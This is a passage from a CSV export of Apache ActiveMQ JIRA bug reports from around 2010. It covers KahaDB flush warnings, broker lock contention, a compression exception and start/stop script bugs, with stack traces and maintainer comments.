In the main, it is not important, that should be at debug or trace
level logging or removed altogether, it is just an indication of the
pagefile sync to disk latency and the amount of concurrent writes that
are pending at the time, an remnant of some performance tuning work
that was done for 5.4.0. the 100ms limit is arbitrary.
Do u mind tracking this with a jira issue as it will probably come up again.

On 8 December 2010 13:54, Aleksandar Ivanisevic
<aleksandar-9OxODCspnFtM+jpbqlvknA@public.gmane.org> wrote:
>
>
> Just switched to kahadb on my amq 5.4.1 (fuse) and the log is filling
> with this:
>
>
> 2010-12-08 14:26:12,668 | WARN  | KahaDB PageFile flush: 3 queued writes, latch wait took 119 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker
> 2010-12-08 14:28:03,769 | WARN  | KahaDB PageFile flush: 7 queued writes, latch wait took 140 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker
> 2010-12-08 14:28:39,125 | WARN  | KahaDB PageFile flush: 3 queued writes, latch wait took 112 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker
> 2010-12-08 14:30:04,928 | WARN  | KahaDB PageFile flush: 8 queued writes, latch wait took 109 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker
> 2010-12-08 14:30:28,788 | WARN  | KahaDB PageFile flush: 8 queued writes, latch wait took 18839 | org.apache.kahadb.page.PageFile | ActiveMQ Journal Checkpoint Worker
>
> quick code search turns out that this warning is fixed to 100ms
>
> http://bit.ly/gYH1Zu
>
> why 100ms and why is this important?
",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14771,,,Thu Dec 09 11:59:06 UTC 2010,,,,,,,,,,,"0|i0ak73:",59545,,,,,,,,,,,,,,,,,,,,,"09/Dec/10 08:52;aivanise;

adding 

log4j.logger.org.apache.kahadb.page.PageFile=ERROR

to /opt/activemq/conf/log4j.properties

silences this warning. Don't know what else it may silence though;;;","09/Dec/10 11:59;gtully;debug perf logging code removed in r1043912;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ConcurrentModificationException thrown in PriorityNetworkDispatchPolicy,AMQ-3071,12492622,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,07/Dec/10 14:59,07/Dec/10 15:01,14/Jul/23 05:43,07/Dec/10 15:01,5.4.2,,,,,5.5.0,,,Broker,,,,0,,,,,,,,,"{code}Caused by: java.util.ConcurrentModificationException
at java.util.AbstractList$Itr.checkForComodification(Unknown Source)
at java.util.AbstractList$Itr.next(Unknown Source)
at org.apache.activemq.broker.region.policy.PriorityNetworkDispatchPolicy.dispatch(PriorityNetworkDispatchPolicy.java:50)
at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:588)
at org.apache.activemq.broker.region.Topic.doMessageSend(Topic.java:446)
at org.apache.activemq.broker.region.Topic.send(Topic.java:387)
at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:354)
at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:445)
at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:126)
at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:95)
at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:224)
at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:126)
at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:126)
at org.apache.activemq.security.AuthorizationBroker.send(AuthorizationBroker.java:187)
at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:133)
at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:453)
at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:631)
at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:303)
at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:181){code}
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14774,,,Tue Dec 07 15:01:24 UTC 2010,,,,,,,,,,,"0|i0agxr:",59017,,,,,,,,,,,,,,,,,,,,,"07/Dec/10 15:01;gtully;noddy remove while iterating without using iterator.remove.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
New clients unable to connect to broker while SubscriptionRecoveryPolicy is running,AMQ-3070,12492056,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,,asussman,asussman,04/Dec/10 02:50,19/Sep/12 14:55,14/Jul/23 05:43,20/Sep/11 11:01,5.4.2,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"Discovered while authoring a custom SubscriptionRecoveryPolicy.

When function 'recover' is being run, no new connections to the broker can be made.  All connection attempts hang until 'recover' returns.

This is a huge problem when recovery takes any amount of time.  In my particular case, recovery can take many minutes.

Note that this problem also prevents the addition/removal of consumers and producers in general, so any threads needing to do so are also blocked.

The issue appears to be a lock on RegionBroker.purgeInactiveDestinationsTask.  I would attempt to fix, but I am unsure of the consequences of messing with this lock and I am unclear on what is being protected here.

Thread doing work in ""recover"":


    ""ActiveMQ Transport: ssl:///10.1.210.140:45407"" - Thread t@48
        at MyCustomSubscriptionRecoveryPolicy.recover(MyCustomSubscriptionRecoveryPolicy.java:xxx)
        at org.apache.activemq.broker.region.Topic.addSubscription(Topic.java:133)
        at org.apache.activemq.broker.region.AbstractRegion.addConsumer(AbstractRegion.java:290)
        - locked java.lang.Object@62f4a9a3
        at org.apache.activemq.broker.region.TopicRegion.addConsumer(TopicRegion.java:111)
        at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:447)
        - locked org.apache.activemq.broker.region.RegionBroker$1@6d0718b7
        at org.apache.activemq.broker.jmx.ManagedRegionBroker.addConsumer(ManagedRegionBroker.java:240)
        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89)
        at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:91)
        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89)
        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89)
        at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:95)
        at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:550)
        at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:349)
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:311)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:228)
        - locked org.apache.activemq.transport.InactivityMonitor$1@2208d444
        at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:81)
        at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:140)
        at org.apache.activemq.transport.stomp.ProtocolConverter.onStompSubscribe(ProtocolConverter.java:425)
        at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:188)
        at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:70)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
        at org.apache.activemq.transport.tcp.SslTransport.doConsume(SslTransport.java:91)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:220)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:202)
        at java.lang.Thread.run(Thread.java:619)

    Locked ownable synchronizers:
    - None


Thread attempting to make new connection:

    ""ActiveMQ Transport: ssl:///10.1.210.140:45408"" - Thread t@55
     java.lang.Thread.State: BLOCKED on org.apache.activemq.broker.region.RegionBroker$1@6d0718b7 owned by: ActiveMQ Transport: ssl:///10.1.210.140:45407 
        at org.apache.activemq.broker.region.RegionBroker.addProducer(RegionBroker.java:392)
        at org.apache.activemq.broker.BrokerFilter.addProducer(BrokerFilter.java:93)
        at org.apache.activemq.advisory.AdvisoryBroker.addProducer(AdvisoryBroker.java:145)
        at org.apache.activemq.broker.CompositeDestinationBroker.addProducer(CompositeDestinationBroker.java:56)
        at org.apache.activemq.broker.BrokerFilter.addProducer(BrokerFilter.java:93)
        at org.apache.activemq.broker.MutableBrokerFilter.addProducer(MutableBrokerFilter.java:99)
        at org.apache.activemq.broker.TransportConnection.processAddProducer(TransportConnection.java:511)
        at org.apache.activemq.command.ProducerInfo.visit(ProducerInfo.java:105)
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:311)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:228)
        - locked org.apache.activemq.transport.InactivityMonitor$1@53134610
        at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:81)
        at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:140)
        at org.apache.activemq.transport.stomp.ProtocolConverter$2.onResponse(ProtocolConverter.java:518)
        at org.apache.activemq.transport.stomp.ProtocolConverter.onActiveMQCommand(ProtocolConverter.java:579)
        at org.apache.activemq.transport.stomp.StompTransportFilter.oneway(StompTransportFilter.java:58)
        at org.apache.activemq.transport.InactivityMonitor.oneway(InactivityMonitor.java:255)
        - locked java.util.concurrent.atomic.AtomicBoolean@165cef0c
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)
        - locked java.lang.Object@2f52084c
        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1249)
        at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:810)
        at org.apache.activemq.broker.TransportConnection.dispatchSync(TransportConnection.java:770)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:187)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:228)
        - locked org.apache.activemq.transport.InactivityMonitor$1@53134610
        at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:81)
        at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:140)
        at org.apache.activemq.transport.stomp.ProtocolConverter.onStompConnect(ProtocolConverter.java:503)
        at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:192)
        at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:70)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
        at org.apache.activemq.transport.tcp.SslTransport.doConsume(SslTransport.java:91)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:220)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:202)
        at java.lang.Thread.run(Thread.java:619)

    Locked ownable synchronizers:
        - None
",,artnaseef,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60059,,,Wed Sep 19 14:55:30 UTC 2012,,,,,,,,,,,"0|i0agxz:",59018,,,,,,,,,,,,,,,,,,,,,"04/Dec/10 03:01;asussman;Note that the apparent inability to complete a connection happens because most
client libs attempt to subscribe to advisory messaging by default, so the connection
appears to hang.

But event if advisory message watching is disabled, the new connection (and any existing
connections) can't create new subscriptions or become new producers while the lock is
active.  So still bad.;;;","11/Jul/11 19:56;tabish;You can now control the number of destinations that are purged in a single GC sweep.  See AMQ-3339.;;;","20/Sep/11 10:56;gtully;reopen to set fix version to 5.6;;;","20/Sep/11 11:01;gtully;closing again with correct fix version;;;","19/Sep/12 14:49;gtully;@Tim, I am thinking that this is a partial fix, if a recover operaton takes a long time, there will still be the lock out. The real fix is to change the way we do recovery. what do you think?;;;","19/Sep/12 14:55;gtully;a real fix for this is not trivial, if we want to support a large backlog, then we need to deal with order and possible additions while dispatching batches of the backlog.
Dispatch should be async in any event.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Error creating tables on Oracle jdbc store ,AMQ-3068,12491876,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,preben,preben,02/Dec/10 13:40,10/Dec/10 16:17,14/Jul/23 05:43,10/Dec/10 16:17,5.4.1,,,,,5.5.0,,,Broker,,,,0,,,,,,,,,"There seems to be an error when using Oracle 10.3. as jdbc store with fuse messagebroker version 5.4.1

I have confirmed that it works with messagebroker version 5.3.1

For detail see : http://fusesource.com/forums/thread.jspa?threadID=2429

/Preben","Windows, oracle 10.3.x",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,46501,,,Fri Dec 10 16:17:24 UTC 2010,,,,,,,,,,,"0|i0ak7j:",59547,,,,,,,,,,,,,,,,,,,,,"10/Dec/10 16:17;gtully;resolved in http://svn.apache.org/viewvc?rev=1038758&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQBlobMessage.copy(..) does not copy the name attribute,AMQ-3067,12491859,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,norman,norman,02/Dec/10 08:34,02/Dec/10 12:44,14/Jul/23 05:43,02/Dec/10 12:44,5.3.0,5.3.1,5.3.2,5.4.0,5.4.1,5.5.0,,,,,,,0,,,,,,,,,When using ActiveMQBlobMessage the name attribute is not copied when calling copy(...). As the default of activemq is to copy on send it get lost.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Dec/10 08:38;norman;AMQ-3067.diff;https://issues.apache.org/jira/secure/attachment/12465115/AMQ-3067.diff",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14770,,,Thu Dec 02 12:44:50 UTC 2010,,,,,,,,,,,"0|i0ak7r:",59548,,,,,,,,,,,,,,,,,,,,,"02/Dec/10 08:38;norman;Trivial fix for the issue;;;","02/Dec/10 12:44;gtully;patch committed in r1041351 - additional test added also which will protect it.
thanks,
Gary.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"""Deflater has been closed"" exception when jms.useCompression=true and using ActiveMQBytesMessage",AMQ-3062,12491724,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,jgassner,jgassner,01/Dec/10 02:15,05/May/11 02:21,14/Jul/23 05:43,05/Dec/10 18:10,5.4.1,,,,,5.5.0,,,Connector,,,,0,,,,,,,,,"When compression is turned on and the ActiveMQBytesMessage is used, the following exception will be encountered:

java.lang.NullPointerException: Deflater has been closed
	at java.util.zip.Deflater.ensureOpen(Deflater.java:427)
	at java.util.zip.Deflater.deflate(Deflater.java:305)
	at java.util.zip.DeflaterOutputStream.deflate(DeflaterOutputStream.java:159)
	at java.util.zip.DeflaterOutputStream.finish(DeflaterOutputStream.java:134)
	at java.util.zip.DeflaterOutputStream.close(DeflaterOutputStream.java:146)
	at java.io.FilterOutputStream.close(FilterOutputStream.java:143)
	at org.apache.activemq.command.ActiveMQBytesMessage$1.close(ActiveMQBytesMessage.java:808)
	at java.io.FilterOutputStream.close(FilterOutputStream.java:143)
	at org.apache.activemq.command.ActiveMQBytesMessage.storeContent(ActiveMQBytesMessage.java:124)
	at org.apache.activemq.command.ActiveMQBytesMessage.copy(ActiveMQBytesMessage.java:109)
	at org.apache.activemq.command.ActiveMQBytesMessage.copy(ActiveMQBytesMessage.java:104)
	at org.apache.activemq.ActiveMQSession.send(ActiveMQSession.java:1735)
	at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:231)",,artnaseef,jgassner,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Dec/10 02:18;jgassner;patch.txt;https://issues.apache.org/jira/secure/attachment/12465020/patch.txt",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14772,,,Thu May 05 02:21:19 UTC 2011,,,,,,,Patch Available,,,,"0|i0ak7z:",59549,,,,,,,,,,,,,,,,,,,,,"01/Dec/10 02:18;jgassner;This patch seems to fix the problem.;;;","05/Dec/10 17:22;tabish;Can you provide a test case that reproduces this problem.;;;","05/Dec/10 18:10;tabish;Was able to reproduce, added a test case and applied the provided patch. fixed in svn rev: 1042388;;;","05/May/11 02:21;artnaseef;Rev 1042388 doesn't have the changes.

Is 1042394 the correct rev?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Stopping ActiveMQ won´t work if the ActiveMQ path contains a whitespace.,AMQ-3058,12491553,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,juleq,juleq,29/Nov/10 16:04,07/Aug/15 21:24,14/Jul/23 05:43,07/Aug/15 21:24,5.4.1,,,,,AGING_TO_DIE,,,Broker,,,,0,,,,,,,,,"The script command ""./activemq stop"" fails when the path to ActiveMQ contains a whitespace. The broker continues to execute. Find a CLI output reproducing this bug below:


zaphod:Software Jule$ cd /Users/Jule/White\ Space/
zaphod:White Space Jule$ cd bin

zaphod:bin Jule$ ./activemq start
INFO: Using default configuration
(you can configure options in one of these file: /etc/default/activemq /Users/Jule/.activemqrc)

INFO: Invoke the following command to create a configuration file
./activemq setup [ /etc/default/activemq | /Users/Jule/.activemqrc ]

INFO: Using java '/System/Library/Frameworks/JavaVM.framework/Home/bin/java'
INFO: Starting - inspect logfiles specified in logging.properties and log4j.properties to get details
INFO: pidfile created : '/Users/Jule/White' (pid '3506')

zaphod:bin Jule$ echo juleq: Waiting for broker to come up...
juleq: Waiting for broker to come up...

zaphod:bin Jule$ ./activemq stop
INFO: Using default configuration
(you can configure options in one of these file: /etc/default/activemq /Users/Jule/.activemqrc)

INFO: Invoke the following command to create a configuration file
./activemq setup [ /etc/default/activemq | /Users/Jule/.activemqrc ]

INFO: Using java '/System/Library/Frameworks/JavaVM.framework/Home/bin/java'
ActiveMQ not running

zaphod:bin Jule$ ps -A | grep ctive
 3506 ttys000    0:11.78 /System/Library/Frameworks/JavaVM.framework/Home/bin/java -Xms256M -Xmx256M -Dorg.apache.activemq.UseDedicatedTaskRunner=true -Djava.util.logging.config.file=logging.properties -Dcom.sun.management.jmxremote -Dactivemq.classpath=/Users/Jule/White Space/conf; -Dactivemq.home=/Users/Jule/White Space -Dactivemq.base=/Users/Jule/White Space -jar /Users/Jule/White Space/bin/run.jar start
 3528 ttys000    0:00.00 grep ctive

zaphod:bin Jule$ echo ""juleq: Broker is still running :-(...""
juleq: Broker is still running :-(...
zaphod:bin Jule$ 
",Mac OS 10.6.5,davsclaus,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,86400,86400,,0%,86400,86400,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74738,,,Fri Aug 07 21:24:36 UTC 2015,,,,,,,,,,,"0|i0eb4v:",81566,,,,,,,,,,,,,,,,,,,,,"02/Nov/13 20:41;davsclaus;It is not a good idea either to use spaces in path names.;;;","07/Aug/15 21:24;tabish;The current scripts seem to work ok with spaces.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Exception when Redelivery ack is processed by topic subscription,AMQ-3056,12483913,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,26/Nov/10 14:36,26/Nov/10 14:47,14/Jul/23 05:43,26/Nov/10 14:47,5.4.1,,,,,5.5.0,,,Broker,,,,0,,,,,,,,,"2010-11-12 17:46:24,124 | WARN  | Async error occurred: javax.jms.JMSException: Invalid acknowledgment: MessageAck {commandId = 29455, responseRequired = false, ackType = 3, consumerId =ID:X-2506-1289583778418-0:0:1:1, firstMessageId =ID:X-51821-634249796434830099-1:5:1:3:313195, lastMessageId = ID:X-51821-634249796434830099-1:5:1:3:313195, destination = topic://help.Publish.Instance1, transactionId = null, messageCount = 1} | org.apache.activemq.broker.TransportConnection.Service | ActiveMQ Transport: tcp:///Y:2508
javax.jms.JMSException: Invalid acknowledgment: MessageAck {commandId = 29455, responseRequired = false, ackType = 3, consumerId = ID:X-2506-1289583778418-0:0:1:1, firstMessageId = ID:X09-51821-634249796434830099-1:5:1:3:313195, lastMessageId = ID:X09-51821-634249796434830099-1:5:1:3:313195, destination = topic://help.Publish.Instance1, transactionId = null, messageCount = 1}
        at org.apache.activemq.broker.region.TopicSubscription.acknowledge(TopicSubscription.java:286)
        at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:383)
        at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:544)
        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:77)
        at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:200)
        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:77)
        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:77)
        at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:87)
        at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:469)
        at org.apache.activemq.command.MessageAck.visit(MessageAck.java:214)
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:311)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:228)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:220)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:202)
        at java.lang.Thread.run(Thread.java:619)
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14773,,,Fri Nov 26 14:47:39 UTC 2010,,,,,,,,,,,"0|i0agy7:",59019,,,,,,,,,,,,,,,,,,,,,"26/Nov/10 14:47;gtully;r1039392
the redeliveryAck (type=3) is handled and ignored by the topic sub, suppressing the default exception behaviour which can clog the logs..;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
add property placeholder bean to activemq-jdbc.xml,AMQ-3054,12483899,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,dejanb,dejanb,dejanb,25/Nov/10 10:02,25/Nov/10 10:07,14/Jul/23 05:43,25/Nov/10 10:07,5.4.1,,,,,5.4.2,,,Broker,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14762,,,Thu Nov 25 10:07:54 UTC 2010,,,,,,,,,,,"0|i0b9uv:",63709,,,,,,,,,,,,,,,,,,,,,"25/Nov/10 10:07;dejanb;Fixed with svn revision 1038976;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
misplaced semicolon in bin/activemq l,AMQ-3053,12483955,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,bimargulies@gmail.com,bimargulies@gmail.com,25/Nov/10 00:21,25/Jan/12 00:42,14/Jul/23 05:43,25/Jan/12 00:42,5.4.1,,,,,,,,,,,,0,,,,,,,,,"{noformat}

ACTIVEMQ_CLASSPATH=""${ACTIVEMQ_CONFIG_DIR};${ACTIVEMQ_CLASSPATH}""
if [ ""${ACTIVEMQ_BASE}"" != ""${ACTIVEMQ_HOME}"" ]; then
    ACTIVEMQ_CLASSPATH=""${ACTIVEMQ_BASE}/conf;${ACTIVEMQ_CLASSPATH}""
fi

{noformat}

Note the use of the _only valid on Windows_ semicolon in appending to the classpath. It needs to be a colon on Linux.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74740,,,Wed Jan 25 00:42:56 UTC 2012,,,,,,,,,,,"0|i0tsxz:",171998,,,,,,,,,,,,,,,,,,,,,"25/Jan/12 00:42;tabish;The revamped scripts should have resolved this issue.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
